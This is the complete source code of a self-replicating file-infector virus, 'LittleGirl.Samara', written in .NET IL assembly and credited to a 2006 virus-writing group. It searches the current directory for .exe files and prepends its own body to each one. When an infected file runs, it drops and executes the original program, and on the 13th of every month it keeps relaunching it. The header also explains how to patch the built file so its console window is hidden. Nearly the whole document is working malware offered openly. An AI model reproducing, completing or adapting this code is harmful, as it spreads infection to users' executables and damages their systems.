//...................................................................................
//virusName :LittleGirl.Samara (v.1.0)
//Infect Using prepending method 
//Coded by using ILASM ( .net environment)
//berniee(fakedminded)\[EOF]---2006
//Description:Virus is to some extent a demo version of ILASM coded virii,it searches
//            all files in current directory infecting them,by adding virus body in the 
//	      beginning of victim files,victim run-->drop and run the old non-infected
//	      program and wait till it ends to delete it.Payload on 13th of every month
//	      virus will start running dropped exe each time the program closes.
//	      the virus in its current version cant handle errors(hope on new versions)
//	      there are currently number of bugs in it/e.g. not recognizing
//	      MSIL files!.
//Thanx :To vxDia for his Damnei virus that I used to code in ilasm :P(after serious 
//	 of pain in hte ass disasm(ildasm),and thanx to all EOF group members.
//
//NOTE:TO REMOVE THE ANNOYING CONSOLE -PATCH THE FORMED EXE AT 0x05c(FROM PE OFFSET)
//     CHANGING IT FROM 0x03 VALUE TO 0x02 VALUE.
//
//....................................................................................

.assembly extern mscorlib{}
.assembly sample{}
.class private auto ansi beforefieldinit Sample
       extends [mscorlib]System.Object
{
  .method public hidebysig static 
          void  Main() cil managed
  { .entrypoint
    .locals (int32 list_exe,string[] all_files,string cur_dir,string p_vir_name,uint8[] read_1,int32 vir_size,class [mscorlib]System.IO.FileStream vir_file,class [mscorlib]System.IO.BinaryReader read_file,int32 counter,class [mscorlib]System.IO.BinaryWriter write_file,int32 cur_p_size,int32 rty,class [mscorlib]System.IO.FileStream victim_file,class [mscorlib]System.IO.BinaryReader read_file_victim,int32 victim_size,uint8[] victim_data,class [mscorlib]System.IO.BinaryWriter write_temp_file,class [mscorlib]System.IO.BinaryWriter write_file_victim ,string temp_host,class [mscorlib]System.IO.FileStream temp_file_object,valuetype [mscorlib]System.DateTime day_)

get_curRun_process:
	call class[System]System.Diagnostics.Process[System]System.Diagnostics.Process::GetCurrentProcess()
	callvirt instance class[System]System.Diagnostics.ProcessModule[System]System.Diagnostics.Process::get_MainModule()
	callvirt string [System]System.Diagnostics.ProcessModule::get_FileName()
	stloc p_vir_name
	ldloc p_vir_name
	call void [mscorlib]System.Console::WriteLine(string)
read_it_1:
//the following value depends on virus assembled size

	ldc.i4 3584    
	stloc vir_size


	ldloc p_vir_name
	ldc.i4 4
	ldc.i4 1
	newobj instance void [mscorlib]System.IO.FileStream::.ctor(string,
	valuetype [mscorlib]System.IO.FileMode,valuetype [mscorlib]System.IO.FileAccess)
	stloc vir_file
	ldloc vir_file
	newobj instance void [mscorlib]System.IO.BinaryReader::.ctor(class 
[mscorlib]System.IO.Stream)
	stloc 	read_file
	
	ldloc vir_file
	callvirt instance int64 [mscorlib]System.IO.Stream::get_Length()
	

	stloc cur_p_size
	ldloc cur_p_size
	newarr [mscorlib]System.Byte
	stloc read_1
	ldc.i4 0
	stloc counter
//read the current process+vir

loop_read_1:
	ldloc read_1
	ldloc counter
	ldloc read_file
	callvirt instance uint8 [mscorlib]System.IO.BinaryReader::ReadByte()
	stelem.i1
	ldloc counter
	ldc.i4 1	
	add
	stloc counter
	ldloc counter
	ldloc cur_p_size
	blt loop_read_1
	
	
	ldc.i4.0
	stloc list_exe
	call string [mscorlib]System.IO.Directory::GetCurrentDirectory()
	stloc cur_dir
	
	ldloc cur_dir
	ldstr "*.exe"
	call string[] [mscorlib]System.IO.Directory::GetFiles(string,string)
	stloc all_files
infect_:
//read victim
	ldloc all_files
	ldloc list_exe
	ldelem.ref
	ldloc p_vir_name
	call bool [mscorlib]System.String::op_Equality(string,string)
	brtrue next_one
	ldloc all_files
	ldloc list_exe
	ldelem.ref
	ldc.i4 4
	ldc.i4 1
	newobj instance void [mscorlib]System.IO.FileStream::.ctor(string,
	valuetype [mscorlib]System.IO.FileMode,valuetype [mscorlib]System.IO.FileAccess)
	stloc victim_file
	ldloc victim_file
	newobj instance void [mscorlib]System.IO.BinaryReader::.ctor(class 
	[mscorlib]System.IO.Stream)
	stloc read_file_victim
	ldloc victim_file
	callvirt instance int64 [mscorlib]System.IO.Stream::get_Length()
	stloc victim_size
	ldloc victim_size
	newarr [mscorlib]System.Byte
	stloc victim_data
	ldc.i4 0
	stloc counter
	
loop_read_2:
	ldloc victim_data
	ldloc counter
	ldloc read_file_victim
	callvirt instance uint8 [mscorlib]System.IO.BinaryReader::ReadByte()
	stelem.i1
	ldloc counter
	ldc.i4 1
	add
	stloc counter
	ldloc counter
	ldloc victim_size
	blt loop_read_2


		
//check for previous infection--(loop was just buggy for me..so this one isntead)

_check:

	ldloc read_1
	ldc.i4 2222
	ldelem.u1
	ldloc victim_data
	ldc.i4 2222
	ldelem.u1
	beq next_1
	br continue_infect
	
next_1:

	ldloc read_1
	ldc.i4 2223
	ldelem.u1
	ldloc victim_data
	ldc.i4 2223
	ldelem.u1
	beq next_one
	br continue_infect
	


continue_infect:
//reset needed things
	ldc.i4 0
	stloc counter
	ldloc read_file_victim
	callvirt instance void [mscorlib]System.IO.BinaryReader::Close()	
//add virus to the beginning of victim
	ldloc all_files
	ldloc list_exe
	ldelem.ref
	ldc.i4 4
	ldc.i4 3
	newobj instance void [mscorlib]System.IO.FileStream::.ctor(string,
	valuetype [mscorlib]System.IO.FileMode,valuetype [mscorlib]System.IO.FileAccess)
	stloc victim_file
	ldloc victim_file
	newobj instance void [mscorlib]System.IO.BinaryWriter::.ctor(class [mscorlib]	System.IO.Stream)
	stloc write_file_victim
	
	
loop_write_1:
	ldloc write_file_victim
	ldloc read_1	
	ldloc counter
	ldelem.u1
	callvirt instance void [mscorlib]System.IO.BinaryWriter::Write(uint8)
	ldloc counter
	ldc.i4 1
	add
	stloc counter
	ldloc counter
	ldloc vir_size
	blt loop_write_1

//reset needed things
	ldc.i4 0
	stloc counter
	
loop_write_2:
	ldloc write_file_victim
	ldloc victim_data
	ldloc counter
	ldelem.u1
	callvirt instance void[mscorlib]System.IO.BinaryWriter::Write(uint8)
	ldloc counter
	ldc.i4 1
	add 
	stloc counter
	ldloc counter
	ldloc victim_size
	blt loop_write_2

next_one:
	ldloc list_exe
	ldc.i4 1
	add
	stloc list_exe
	ldloc list_exe
	ldloc all_files
	ldlen 
	conv.i4
	blt infect_

//check the first run


	ldloc vir_file
	callvirt instance int64 [mscorlib]System.IO.Stream::get_Length()
	

	stloc cur_p_size
	ldloc cur_p_size
	ldloc vir_size
	ble exit_



drop_:	
//create temp file and run it..

	ldloc p_vir_name
	ldstr "~"
	ldstr "123.exe"
	call string [mscorlib]System.String::Concat(string,string,string)
	stloc temp_host
	ldloc temp_host	
	ldc.i4 4
	ldc.i4 3
	newobj instance void [mscorlib]System.IO.FileStream::.ctor(string,
	valuetype [mscorlib]System.IO.FileMode,valuetype [mscorlib]System.IO.FileAccess)
	stloc temp_file_object
	ldloc temp_file_object
	newobj instance void [mscorlib]System.IO.BinaryWriter::.ctor(class [mscorlib]	System.IO.Stream)
	stloc write_temp_file
	ldloc vir_size

	stloc counter
	ldloc vir_file
	callvirt instance int64 [mscorlib]System.IO.Stream::get_Length()
	

	stloc cur_p_size
loop_write_0:
	ldloc write_temp_file
	ldloc read_1
	ldloc counter
	ldelem.u1
	callvirt instance void [mscorlib]System.IO.BinaryWriter::Write(uint8)
	ldloc counter
	ldc.i4 1
	add
	stloc counter
	ldloc counter
	ldloc cur_p_size
	blt loop_write_0
	ldloc	write_temp_file 
	callvirt instance void [mscorlib]System.IO.BinaryWriter::Close()			


payload_loop:
	ldloc temp_host
	call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
	callvirt   instance void [System]System.Diagnostics.Process::WaitForExit()

	call       valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Now()
	stloc day_
	ldloca day_
	call       instance int32 [mscorlib]System.DateTime::get_Day()
	ldc.i4 13
	beq payload_loop	 

	
	ldloc temp_host
	call       void [mscorlib]System.IO.File::Delete(string)
	



			
exit_:
	
ret
}
}